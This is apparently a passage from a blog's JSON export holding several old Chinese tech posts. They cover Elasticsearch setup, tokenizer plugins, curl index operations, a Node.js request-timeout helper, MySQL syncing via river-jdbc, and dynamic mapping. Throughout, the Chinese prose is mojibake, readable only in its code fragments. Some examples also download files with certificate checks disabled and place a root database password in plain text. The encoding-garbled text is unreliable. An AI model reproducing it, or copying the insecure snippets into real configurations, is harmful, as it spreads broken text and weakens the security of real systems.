‹ã€‚ä¸‹é¢æ˜¯å‘½ä»¤é›†åˆï¼šbin/service/elasticsearch +console åœ¨å‰å°è¿è¡Œesstart åœ¨åå°è¿è¡Œesstop åœæ­¢esinstall ä½¿esä½œä¸ºæœåŠ¡åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨remove å–æ¶ˆå¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨åœ¨serviceç›®å½•ä¸‹æœ‰ä¸ªelasticsearch.confé…ç½®æ–‡ä»¶ï¼Œä¸»è¦æ˜¯è®¾ç½®ä¸€äº›javaè¿è¡Œç¯å¢ƒå‚æ•°ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯ä¸‹é¢çš„å‚æ•°ï¼š#esçš„homeè·¯å¾„ï¼Œä¸ç”¨ç”¨é»˜è®¤å€¼å°±å¯ä»¥set.default.ES_HOME=#åˆ†é…ç»™esçš„æœ€å°å†…å­˜set.default.ES_MIN_MEM=256#åˆ†é…ç»™esçš„æœ€å¤§å†…å­˜set.default.ES_MAX_MEM=1024 å¯åŠ¨ç­‰å¾…è¶…æ—¶æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰wrapper.startup.timeout=300 å…³é—­ç­‰å¾…è¶…æ—¶æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰wrapper.shutdown.timeout=300 pingè¶…æ—¶æ—¶é—´(ä»¥ç§’ä¸ºå•ä½)wrapper.ping.timeout=300å®‰è£…æ’ä»¶ä»¥headæ’ä»¶ä¸ºä¾‹ï¼šè”ç½‘æ—¶ï¼Œç›´æ¥è¿è¡Œ%ES_HOME%\\bin\\plugin -install mobz/elasticsearch-headä¸è”ç½‘æ—¶ï¼Œä¸‹è½½elasticsearch-headçš„zipballçš„masteråŒ…ï¼ŒæŠŠå†…å®¹è§£å‹åˆ°%ES_HOME%\\plugin\\head_siteç›®å½•ä¸‹ï¼Œå®‰è£…å®Œæˆï¼Œé‡å¯æœåŠ¡ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€ http://localhost:9200/_plugin/head/ å³å¯ESæ¦‚å¿µclusterä»£è¡¨ä¸€ä¸ªé›†ç¾¤ï¼Œé›†ç¾¤ä¸­æœ‰å¤šä¸ªèŠ‚ç‚¹ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªä¸ºä¸»èŠ‚ç‚¹ï¼Œè¿™ä¸ªä¸»èŠ‚ç‚¹æ˜¯å¯ä»¥é€šè¿‡é€‰ä¸¾äº§ç”Ÿçš„ï¼Œä¸»ä»èŠ‚ç‚¹æ˜¯å¯¹äºé›†ç¾¤å†…éƒ¨æ¥è¯´çš„ã€‚esçš„ä¸€ä¸ªæ¦‚å¿µå°±æ˜¯å»ä¸­å¿ƒåŒ–ï¼Œå­—é¢ä¸Šç†è§£å°±æ˜¯æ— ä¸­å¿ƒèŠ‚ç‚¹ï¼Œè¿™æ˜¯å¯¹äºé›†ç¾¤å¤–éƒ¨æ¥è¯´çš„ï¼Œå› ä¸ºä»å¤–éƒ¨æ¥çœ‹esé›†ç¾¤ï¼Œåœ¨é€»è¾‘ä¸Šæ˜¯ä¸ªæ•´ä½“ï¼Œä½ ä¸ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹çš„é€šä¿¡å’Œä¸æ•´ä¸ªesé›†ç¾¤é€šä¿¡æ˜¯ç­‰ä»·çš„ã€‚shardsä»£è¡¨ç´¢å¼•åˆ†ç‰‡ï¼Œeså¯ä»¥æŠŠä¸€ä¸ªå®Œæ•´çš„ç´¢å¼•åˆ†æˆå¤šä¸ªåˆ†ç‰‡ï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯å¯ä»¥æŠŠä¸€ä¸ªå¤§çš„ç´¢å¼•æ‹†åˆ†æˆå¤šä¸ªï¼Œåˆ†å¸ƒåˆ°ä¸åŒçš„èŠ‚ç‚¹ä¸Šã€‚æ„æˆåˆ†å¸ƒå¼æœç´¢ã€‚åˆ†ç‰‡çš„æ•°é‡åªèƒ½åœ¨ç´¢å¼•åˆ›å»ºå‰æŒ‡å®šï¼Œå¹¶ä¸”ç´¢å¼•åˆ›å»ºåä¸èƒ½æ›´æ”¹ã€‚replicasä»£è¡¨ç´¢å¼•å‰¯æœ¬ï¼Œeså¯ä»¥è®¾ç½®å¤šä¸ªç´¢å¼•çš„å‰¯æœ¬ï¼Œå‰¯æœ¬çš„ä½œç”¨ä¸€æ˜¯æé«˜ç³»ç»Ÿçš„å®¹é”™æ€§ï¼Œå½“ä¸ªæŸä¸ªèŠ‚ç‚¹æŸä¸ªåˆ†ç‰‡æŸåæˆ–ä¸¢å¤±æ—¶å¯ä»¥ä»å‰¯æœ¬ä¸­æ¢å¤ã€‚äºŒæ˜¯æé«˜esçš„æŸ¥è¯¢æ•ˆç‡ï¼Œesä¼šè‡ªåŠ¨å¯¹æœç´¢è¯·æ±‚è¿›è¡Œè´Ÿè½½å‡è¡¡ã€‚recoveryä»£è¡¨æ•°æ®æ¢å¤æˆ–å«æ•°æ®é‡æ–°åˆ†å¸ƒï¼Œesåœ¨æœ‰èŠ‚ç‚¹åŠ å…¥æˆ–é€€å‡ºæ—¶ä¼šæ ¹æ®æœºå™¨çš„è´Ÿè½½å¯¹ç´¢å¼•åˆ†ç‰‡è¿›è¡Œé‡æ–°åˆ†é…ï¼ŒæŒ‚æ‰çš„èŠ‚ç‚¹é‡æ–°å¯åŠ¨æ—¶ä¹Ÿä¼šè¿›è¡Œæ•°æ®æ¢å¤ã€‚riverä»£è¡¨esçš„ä¸€ä¸ªæ•°æ®æºï¼Œä¹Ÿæ˜¯å…¶å®ƒå­˜å‚¨æ–¹å¼ï¼ˆå¦‚ï¼šæ•°æ®åº“ï¼‰åŒæ­¥æ•°æ®åˆ°esçš„ä¸€ä¸ªæ–¹æ³•ã€‚å®ƒæ˜¯ä»¥æ’ä»¶æ–¹å¼å­˜åœ¨çš„ä¸€ä¸ªesæœåŠ¡ï¼Œé€šè¿‡è¯»å–riverä¸­çš„æ•°æ®å¹¶æŠŠå®ƒç´¢å¼•åˆ°esä¸­ï¼Œå®˜æ–¹çš„riveræœ‰couchDBçš„ï¼ŒRabbitMQçš„ï¼ŒTwitterçš„ï¼ŒWikipediaçš„ã€‚gatewayä»£è¡¨esç´¢å¼•çš„æŒä¹…åŒ–å­˜å‚¨æ–¹å¼ï¼Œesé»˜è®¤æ˜¯å…ˆæŠŠç´¢å¼•å­˜æ”¾åˆ°å†…å­˜ä¸­ï¼Œå½“å†…å­˜æ»¡äº†æ—¶å†æŒä¹…åŒ–åˆ°ç¡¬ç›˜ã€‚å½“è¿™ä¸ªesé›†ç¾¤å…³é—­å†é‡æ–°å¯åŠ¨æ—¶å°±ä¼šä»gatewayä¸­è¯»å–ç´¢å¼•æ•°æ®ã€‚esæ”¯æŒå¤šç§ç±»å‹çš„gatewayï¼Œæœ‰æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼ˆé»˜è®¤ï¼‰ï¼Œåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿï¼ŒHadoopçš„HDFSå’Œamazonçš„s3äº‘å­˜å‚¨æœåŠ¡ã€‚discovery.zenä»£è¡¨esçš„è‡ªåŠ¨å‘ç°èŠ‚ç‚¹æœºåˆ¶ï¼Œesæ˜¯ä¸€ä¸ªåŸºäºp2pçš„ç³»ç»Ÿï¼Œå®ƒå…ˆé€šè¿‡å¹¿æ’­å¯»æ‰¾å­˜åœ¨çš„èŠ‚ç‚¹ï¼Œå†é€šè¿‡å¤šæ’­åè®®æ¥è¿›è¡ŒèŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒç‚¹å¯¹ç‚¹çš„äº¤äº’ã€‚Transportä»£è¡¨eså†…éƒ¨èŠ‚ç‚¹æˆ–é›†ç¾¤ä¸å®¢æˆ·ç«¯çš„äº¤äº’æ–¹å¼ï¼Œé»˜è®¤å†…éƒ¨æ˜¯ä½¿ç”¨tcpåè®®è¿›è¡Œäº¤äº’ï¼ŒåŒæ—¶å®ƒæ”¯æŒhttpåè®®ï¼ˆjsonæ ¼å¼ï¼‰ã€thriftã€servletã€memcachedã€zeroMQç­‰çš„ä¼ è¾“åè®®ï¼ˆé€šè¿‡æ’ä»¶æ–¹å¼é›†æˆï¼‰ã€‚åˆ†å¸ƒå¼æœç´¢elasticsearchä¸­æ–‡åˆ†è¯é›†æˆelasticsearchå®˜æ–¹åªæä¾›smartcnè¿™ä¸ªä¸­æ–‡åˆ†è¯æ’ä»¶ï¼Œæ•ˆæœä¸æ˜¯å¾ˆå¥½ï¼Œå¥½åœ¨å›½å†…æœ‰medclå¤§ç¥ï¼ˆå›½å†…æœ€æ—©ç ”ç©¶esçš„äººä¹‹ä¸€ï¼‰å†™çš„ä¸¤ä¸ªä¸­æ–‡åˆ†è¯æ’ä»¶ï¼Œä¸€ä¸ªæ˜¯ikçš„ï¼Œä¸€ä¸ªæ˜¯mmsegçš„ï¼Œä¸‹é¢åˆ†åˆ«ä»‹ç»ä¸‹ä¸¤è€…çš„ç”¨æ³•ï¼Œå…¶å®éƒ½å·®ä¸å¤šçš„ï¼Œå…ˆå®‰è£…æ’ä»¶ï¼Œå‘½ä»¤è¡Œï¼šå®‰è£…ikæ’ä»¶ï¼šplugin -install medcl/elasticsearch-analysis-ik/1.1.0ä¸‹è½½ikç›¸å…³é…ç½®è¯å…¸æ–‡ä»¶åˆ°configç›®å½•cd configwget http://github.com/downloads/medcl/elasticsearch-analysis-ik/ik.zip --no-check-certificateunzip ik.ziprm ik.zipå®‰è£…mmsegæ’ä»¶ï¼šbin/plugin -install medcl/elasticsearch-analysis-mmseg/1.1.0ä¸‹è½½ç›¸å…³é…ç½®è¯å…¸æ–‡ä»¶åˆ°configç›®å½•cd configwget http://github.com/downloads/medcl/elasticsearch-analysis-mmseg/mmseg.zip --no-check-certificateunzip mmseg.ziprm mmseg.zipåˆ†è¯é…ç½®ikåˆ†è¯é…ç½®ï¼Œåœ¨elasticsearch.ymlæ–‡ä»¶ä¸­åŠ ä¸Šindex:analysis:analyzer:ik:alias:type: org.elasticsearch.index.analysis.IkAnalyzerProvideræˆ–index.analysis.analyzer.ik.type : â€œikâ€è¿™ä¸¤å¥çš„æ„ä¹‰ç›¸åŒmmsegåˆ†è¯é…ç½®ï¼Œä¹Ÿæ˜¯åœ¨åœ¨elasticsearch.ymlæ–‡ä»¶ä¸­index:analysis:analyzer:mmseg:alias:type: org.elasticsearch.index.analysis.MMsegAnalyzerProvideræˆ–index.analysis.analyzer.default.type : â€œmmsegâ€mmsegåˆ†è¯è¿˜æœ‰äº›æ›´åŠ ä¸ªæ€§åŒ–çš„å‚æ•°è®¾ç½®å¦‚ä¸‹index:analysis:tokenizer:mmseg_maxword:type: mmsegseg_type: â€œmax_wordâ€mmseg_complex:type: mmsegseg_type: â€œcomplexâ€mmseg_simple:type: mmsegseg_type: â€œsimpleâ€è¿™æ ·é…ç½®å®Œåæ’ä»¶å®‰è£…å®Œæˆï¼Œå¯åŠ¨eså°±ä¼šåŠ è½½æ’ä»¶ã€‚å®šä¹‰mappingåœ¨æ·»åŠ ç´¢å¼•çš„mappingæ—¶å°±å¯ä»¥è¿™æ ·å®šä¹‰åˆ†è¯å™¨{â€œpageâ€:{â€œpropertiesâ€:{â€œtitleâ€:{â€œtypeâ€:â€œstringâ€,â€œindexAnalyzerâ€:â€œikâ€,â€œsearchAnalyzerâ€:â€œikâ€},â€œcontentâ€:{â€œtypeâ€:â€œstringâ€,â€œindexAnalyzerâ€:â€œikâ€,â€œsearchAnalyzerâ€:â€œikâ€}}}}indexAnalyzerä¸ºç´¢å¼•æ—¶ä½¿ç”¨çš„åˆ†è¯å™¨ï¼ŒsearchAnalyzerä¸ºæœç´¢æ—¶ä½¿ç”¨çš„åˆ†è¯å™¨ã€‚java mappingä»£ç å¦‚ä¸‹ï¼šXContentBuilder content = XContentFactory.jsonBuilder().startObject().startObject(â€œpageâ€).startObject(â€œpropertiesâ€).startObject(â€œtitleâ€).field(â€œtypeâ€, â€œstringâ€).field(â€œindexAnalyzerâ€, â€œikâ€).field(â€œsearchAnalyzerâ€, â€œikâ€).endObject().startObject(â€œcodeâ€).field(â€œtypeâ€, â€œstringâ€).field(â€œindexAnalyzerâ€, â€œikâ€).field(â€œsearchAnalyzerâ€, â€œikâ€).endObject().endObject().endObject().endObject()å®šä¹‰å®Œåæ“ä½œç´¢å¼•å°±ä¼šä»¥æŒ‡å®šçš„åˆ†è¯å™¨æ¥è¿›è¡Œåˆ†è¯ã€‚é™„ï¼šikåˆ†è¯æ’ä»¶é¡¹ç›®åœ°å€ï¼šhttps://github.com/medcl/elasticsearch-analysis-ikmmsegåˆ†è¯æ’ä»¶é¡¹ç›®åœ°å€ï¼šhttps://github.com/medcl/elasticsearch-analysis-mmsegå¦‚æœè§‰å¾—é…ç½®éº»çƒ¦ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½ä¸ªé…ç½®å¥½çš„esç‰ˆæœ¬ï¼Œåœ°å€å¦‚ä¸‹ï¼šhttps://github.com/medcl/elasticsearch-rtfelasticsearchçš„åŸºæœ¬ç”¨æ³•æœ€å¤§çš„ç‰¹ç‚¹ï¼šæ•°æ®åº“çš„ database, å°±æ˜¯ indexæ•°æ®åº“çš„ table, å°±æ˜¯ tagä¸è¦ä½¿ç”¨browserï¼Œ ä½¿ç”¨curlæ¥è¿›è¡Œå®¢æˆ·ç«¯æ“ä½œ. å¦åˆ™ä¼šå‡ºç° java heap ooxxâ€¦curl: -X åé¢è·Ÿ RESTful ï¼š GET, POST â€¦-d åé¢è·Ÿæ•°æ®ã€‚ (d = data to send)create:æŒ‡å®š ID æ¥å»ºç«‹æ–°è®°å½•ã€‚ ï¼ˆè²Œä¼¼PUTï¼Œ POSTéƒ½å¯ä»¥ï¼‰$ curl -XPOST localhost:9200/films/md/2 -d â€™{ â€œnameâ€:â€œhei yi renâ€, â€œtagâ€: â€œgoodâ€}â€™ä½¿ç”¨è‡ªåŠ¨ç”Ÿæˆçš„ ID å»ºç«‹æ–°çºªå½•ï¼š$ curl -XPOST localhost:9200/films/md -d â€™{ â€œnameâ€:â€œma da jia si jia3â€, â€œtagâ€: â€œgoodâ€}â€™æŸ¥è¯¢ï¼š2.1 æŸ¥è¯¢æ‰€æœ‰çš„ index, type:$ curl localhost:9200/_search?pretty=true2.2 æŸ¥è¯¢æŸä¸ªindexä¸‹æ‰€æœ‰çš„type:$ curl localhost:9200/films/_search2.3 æŸ¥è¯¢æŸä¸ªindex ä¸‹ï¼Œ æŸä¸ª typeä¸‹æ‰€æœ‰çš„è®°å½•ï¼š$ curl localhost:9200/films/md/_search?pretty=true2.4 å¸¦æœ‰å‚æ•°çš„æŸ¥è¯¢ï¼š$ curl localhost:9200/films/md/_search?q=tag:good{â€œtookâ€:7,â€œtimed_outâ€:false,&quot;_shards&quot;:{â€œtotalâ€:5,â€œsuccessfulâ€:5,â€œfailedâ€:0},â€œhitsâ€:{â€œtotalâ€:2,â€œmax_scoreâ€:1.0,â€œhitsâ€:}}2.5 ä½¿ç”¨JSONå‚æ•°çš„æŸ¥è¯¢ï¼š ï¼ˆæ³¨æ„ query å’Œ term å…³é”®å­—ï¼‰$ curl localhost:9200/film/_search -d â€™{â€œqueryâ€ : { â€œtermâ€: { â€œtagâ€:â€œbadâ€}}}â€™update$ curl -XPUT localhost:9200/films/md/1 -d { â€¦(data)â€¦ }åˆ é™¤ã€‚ åˆ é™¤æ‰€æœ‰çš„ï¼š$ curl -XDELETE localhost:9200/filmsçœ‹äº†è¿™ç¯‡æ–‡ç« çš„äººè¿˜çœ‹äº†ï¼šElasticsearché›†æˆä¸­æ–‡åˆ†è¯elasticsearchçš„ä¸­æ–‡åˆ†è¯æ’ä»¶ansjåˆ†å¸ƒå¼æœç´¢elasticsearchä¸­æ–‡åˆ†è¯é›†æˆelasticsearchå®‰è£…é…ç½®åŠä¸­æ–‡åˆ†è¯ElasticSearch carrot2æ’ä»¶ã€ikåˆ†è¯æ’ä»¶æ›´æ–°ElasticSearchå¼€å‘ç¯å¢ƒæ­å»ºç›¸å…³æœç´¢ï¼š elasticsearchå®‰è£… elasticsearché…ç½® elasticsearchä¸­æ–‡åˆ†è¯","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"nodejs, http.requestè¶…æ—¶æ§åˆ¶","slug":"history/tech/5953c4d0c2b92f5665eed9ad","date":"2015-12-27T02:28:43.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ad/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ad/","excerpt":"","text":"åœºæ™¯: ä½¿ç”¨nodejsè¯·æ±‚å¤–éƒ¨ç½‘é¡µ,è¦æ±‚è§„å®šæ—¶é—´å†…è¿”å›ä¾èµ–åº“: http/httpsæ–¹æ¡ˆ:ç”±äºnodejsè‡ªèº«æ²¡æœ‰å¯¹httpè¿æ¥çš„å¯é…ç½®çš„è¶…æ—¶æ§åˆ¶æœºåˆ¶,éœ€è¦è‡ªè¡Œå¢åŠ /**if timeout, emit â€œtimeoutâ€ event, abort request, and emit â€œabortâ€ event for response@param options@param timeout@param callback*/function httpGetWithTimeoutSupport(options, timeout, callback) {var timeoutEvent;var req = http.get(options, function(res) {res.on(â€œendâ€, function() {clearTimeout(timeoutEvent);console.log(â€œendâ€);})res.on(â€œcloseâ€, function(e) {clearTimeout(timeoutEvent);console.log(â€œcloseâ€);}) res.on(&quot;abort&quot;, function() { console.log(&quot;abort&quot;); }); callback(res); });req.on(â€œtimeoutâ€, function() {console.log(â€œtimeout receivedâ€);if (req.res) {req.res.emit(â€œabortâ€);} req.abort(); });timeoutEvent = setTimeout(function() {req.emit(â€œtimeoutâ€);}, timeout);return req;}httpGetWithTimeoutSupport(url.parse(â€œhttp://www.google.comâ€), 1000, function(res){var data = â€œâ€;res.on(â€œdataâ€, function(d) {data += d;});res.on(â€œendâ€, function() {console.log(data);})});nodejsè‡ªå¸¦ä¸€ä¸ªé»˜è®¤çš„2åˆ†é’Ÿçš„å¼ºåˆ¶è¶…æ—¶, è§http.js;è¿™ä¸ªè¶…æ—¶ä¼šå¯¼è‡´closeäº‹ä»¶å‘ç”Ÿ,é”™è¯¯ä»£ç ä¸º&quot;timeout&quot;. åŒæ—¶è¶…æ—¶æ˜¯é’ˆå¯¹è¿æ¥è€Œéå•ä¸ªçš„è¯·æ±‚çš„(ä¸€ä¸ªè¿æ¥ä¸Šæœ‰è®¸å¤šè¯·æ±‚).","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"elasticsearchesåŒæ­¥æ•°æ®river jdbcæ’ä»¶esæ“ä½œæ•°æ®åº“esæ“ä½œmysql","slug":"history/tech/5953c4d0c2b92f5665eed9ac","date":"2015-12-26T03:43:13.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ac/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ac/","excerpt":"","text":"æ‘˜å½•ï¼šæˆ‘ç”¨elasticsearch-river-jdbcæ·»åŠ äº†ä¸€ä¸ªmysqlçš„æ•°æ®æºã€‚ä»£ç å¦‚ä¸‹ï¼šcurl -XPUT â€˜localhost:9200/_river/bankinfo/_metaâ€™ -d â€˜{â€œstrategyâ€ : â€œsimpleâ€,â€œintervalâ€ : 0,â€œflush_intervalâ€ : â€œ5sâ€,â€œtypeâ€ : â€œjdbcâ€,â€œjdbcâ€: {â€œdriverâ€: â€œcom.mysql.jdbc.Driverâ€,â€œurlâ€: â€œjdbc:mysql://192.168.1.91:3306/gameâ€,â€œuserâ€: â€œrootâ€,â€œpasswordâ€: â€œ111â€,â€œsqlâ€: â€œselect * from bank_infoâ€,â€œintervalâ€:â€œ1800â€,ï¼ˆç§’ï¼‰â€œindexâ€ : â€œbank_info_dbâ€,â€œtypeâ€ : â€œbank_info_tableâ€}}â€™select id as â€œ_idâ€ from bank_info è¿™æ ·çš„è¯ esä¸­çš„_idå°±ä¸ä¼šåœ¨æ¯æ¬¡åŒæ­¥çš„æ—¶å€™å¢åŠ äº†ï¼Œé‚£ä¹ˆæ•°æ®ä¹Ÿå°±ä¸ä¼šç´¯åŠ ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"åŠ¨æ€æ˜ å°„(Dynamic Mapping)","slug":"history/tech/5953c4d0c2b92f5665eed9a8","date":"2015-12-25T04:54:20.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a8/","excerpt":"","text":"åŠ¨æ€æ˜ å°„(Dynamic Mapping)å½“ESåœ¨æ–‡æ¡£ä¸­ç¢°åˆ°ä¸€ä¸ªä»¥å‰æ²¡è§è¿‡çš„å­—æ®µæ—¶ï¼Œå®ƒä¼šåˆ©ç”¨åŠ¨æ€æ˜ å°„æ¥å†³å®šè¯¥å­—æ®µçš„ç±»å‹ï¼Œå¹¶è‡ªåŠ¨åœ°å¯¹è¯¥å­—æ®µæ·»åŠ æ˜ å°„ã€‚æœ‰æ—¶è¿™æ­£æ˜¯éœ€è¦çš„è¡Œä¸ºï¼Œä½†æœ‰æ—¶ä¸æ˜¯ã€‚ä½ æˆ–è®¸ä¸çŸ¥é“åœ¨ä»¥åä½ çš„æ–‡æ¡£ä¸­ä¼šæ·»åŠ å“ªäº›å­—æ®µï¼Œä½†æ˜¯ä½ æƒ³è¦å®ƒä»¬èƒ½å¤Ÿè¢«è‡ªåŠ¨åœ°ç´¢å¼•ã€‚æˆ–è®¸ä½ åªæ˜¯æƒ³è¦å¿½ç•¥å®ƒä»¬ã€‚æˆ–è€… - å°¤å…¶å½“ä½ å°†ESå½“åšä¸»è¦çš„æ•°æ®å­˜å‚¨ä½¿ç”¨æ—¶ - å¤§æ¦‚ä½ ä¼šå¸Œæœ›è¿™äº›æœªçŸ¥çš„å­—æ®µä¼šæŠ›å‡ºå¼‚å¸¸æ¥æé†’ä½ æ³¨æ„è¿™ä¸€é—®é¢˜ã€‚å¹¸è¿çš„æ˜¯ï¼Œä½ å¯ä»¥é€šè¿‡dynamicè®¾ç½®æ¥æ§åˆ¶è¿™ä¸€è¡Œä¸ºï¼Œå®ƒèƒ½å¤Ÿæ¥å—ä»¥ä¸‹çš„é€‰é¡¹ï¼štrueï¼šé»˜è®¤å€¼ã€‚åŠ¨æ€æ·»åŠ å­—æ®µfalseï¼šå¿½ç•¥æ–°å­—æ®µstrictï¼šå¦‚æœç¢°åˆ°é™Œç”Ÿå­—æ®µï¼ŒæŠ›å‡ºå¼‚å¸¸dynamicè®¾ç½®å¯ä»¥é€‚ç”¨åœ¨æ ¹å¯¹è±¡ä¸Šæˆ–è€…objectç±»å‹çš„ä»»æ„å­—æ®µä¸Šã€‚ä½ åº”è¯¥é»˜è®¤åœ°å°†dynamicè®¾ç½®ä¸ºstrictï¼Œä½†æ˜¯ä¸ºæŸä¸ªç‰¹å®šçš„å†…éƒ¨å¯¹è±¡å¯ç”¨å®ƒï¼šPUT /my_index{** â€œmappingsâ€: {**** â€œmy_typeâ€: {**** â€œdynamicâ€: â€œstrictâ€, **** â€œpropertiesâ€: {**** â€œtitleâ€: { â€œtypeâ€: â€œstringâ€},**** â€œstashâ€: {**** â€œtypeâ€: â€œobjectâ€,**** â€œdynamicâ€: true **** }**** }**** }**** }**}åœ¨my_typeå¯¹è±¡ä¸Šå¦‚æœç¢°åˆ°äº†æœªçŸ¥å­—æ®µåˆ™ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚ åœ¨stashå¯¹è±¡ä¸Šä¼šåŠ¨æ€æ·»åŠ æ–°å­—æ®µã€‚é€šè¿‡ä»¥ä¸Šçš„æ˜ å°„ï¼Œä½ å¯ä»¥å‘stashæ·»åŠ æ–°çš„å¯æœç´¢çš„å­—æ®µï¼šPUT /my_index/my_type/1{** â€œtitleâ€: â€œThis doc adds a new fieldâ€,**** â€œstashâ€: {**** â€œnew_fieldâ€: â€œSuccess!â€**** }**}ä½†æ˜¯ï¼Œå¦‚æœåœ¨é¡¶å±‚å¯¹è±¡ä¸Šè¯•å›¾æ·»åŠ æ–°å­—æ®µåˆ™ä¼šå¤±è´¥ï¼šPUT /my_index/my_type/1{** â€œtitleâ€: â€œThis throws a StrictDynamicMappingExceptionâ€,**** â€œnew_fieldâ€: â€œFail!â€**}NOTEå°†dynamicè®¾ç½®ä¸ºfalseå¹¶ä¸ä¼šæ”¹å˜_sourceå­—æ®µçš„å†…å®¹ - _sourceå­—æ®µä»ç„¶ä¼šä¿å­˜ä½ ç´¢å¼•çš„æ•´ä¸ªJSONæ–‡æ¡£ã€‚åªä¸è¿‡æ˜¯é™Œç”Ÿçš„å­—æ®µå°†ä¸ä¼šè¢«æ·»åŠ åˆ°æ˜ å°„ä¸­ï¼Œä»¥è‡³äºå®ƒä¸èƒ½è¢«æœç´¢åˆ°ã€‚è‡ªå®šä¹‰åŠ¨æ€æ˜ å°„å¦‚æœä½ çŸ¥é“ä½ éœ€è¦åŠ¨æ€çš„æ·»åŠ çš„æ–°å­—æ®µï¼Œé‚£ä¹ˆä½ ä¹Ÿè®¸ä¼šå¯ç”¨åŠ¨æ€æ˜ å°„ã€‚ç„¶è€Œæœ‰æ—¶åŠ¨æ€æ˜ å°„çš„è§„åˆ™åˆæœ‰äº›ä¸å¤Ÿçµæ´»ã€‚å¹¸è¿çš„æ˜¯ï¼Œä½ å¯ä»¥è°ƒæ•´æŸäº›è®¾ç½®æ¥è®©åŠ¨æ€æ˜ å°„çš„è§„åˆ™æ›´åŠ é€‚åˆä½ çš„æ•°æ®ã€‚date_detectionå½“ESç¢°åˆ°ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²å­—æ®µæ—¶ï¼Œå®ƒä¼šæ£€æŸ¥è¯¥å­—ä¸²æ˜¯å¦å«æœ‰ä¸€ä¸ªå¯è¢«è¯†åˆ«çš„æ—¥æœŸï¼Œæ¯”å¦‚2014-01-01ã€‚å¦‚æœå­˜åœ¨ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«è¯†åˆ«ä¸ºä¸€ä¸ªdateç±»å‹çš„å­—æ®µã€‚å¦åˆ™ä¼šå°†å®ƒä½œä¸ºstringè¿›è¡Œæ·»åŠ ã€‚æœ‰æ—¶è¿™ç§è¡Œä¸ºä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ã€‚å¦‚æœä½ æƒ³è¦ç´¢å¼•ä¸€ä»½è¿™æ ·çš„æ–‡æ¡£ï¼š{ â€œnoteâ€: â€œ2014-01-01â€ }å‡è®¾è¿™æ˜¯noteå­—æ®µç¬¬ä¸€æ¬¡è¢«å‘ç°ï¼Œé‚£ä¹ˆæ ¹æ®è§„åˆ™å®ƒä¼šè¢«ä½œä¸ºdateå­—æ®µæ·»åŠ ã€‚ä½†æ˜¯å¦‚æœä¸‹ä¸€ä»½æ–‡æ¡£æ˜¯è¿™æ ·çš„ï¼š{ â€œnoteâ€: â€œLogged outâ€ }è¿™æ—¶è¯¥å­—æ®µæ˜¾ç„¶ä¸æ˜¯æ—¥æœŸï¼Œä½†æ˜¯å·²ç»å¤ªè¿Ÿäº†ã€‚è¯¥å­—æ®µçš„ç±»å‹å·²ç»æ˜¯æ—¥æœŸç±»å‹çš„å­—æ®µäº†ï¼Œå› æ­¤è¿™ä¼šå¯¼è‡´ä¸€ä¸ªå¼‚å¸¸è¢«æŠ›å‡ºã€‚å¯ä»¥é€šè¿‡åœ¨æ ¹å¯¹è±¡ä¸Šå°†date_detectionè®¾ç½®ä¸ºfalseæ¥å…³é—­æ—¥æœŸæ£€æµ‹ï¼šPUT /my_index{** â€œmappingsâ€: {**** â€œmy_typeâ€: {**** â€œdate_detectionâ€: false**** }**** }**}æœ‰äº†ä»¥ä¸Šçš„æ˜ å°„ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²æ€»æ˜¯ä¼šè¢«å½“åšstringç±»å‹ã€‚å¦‚æœä½ 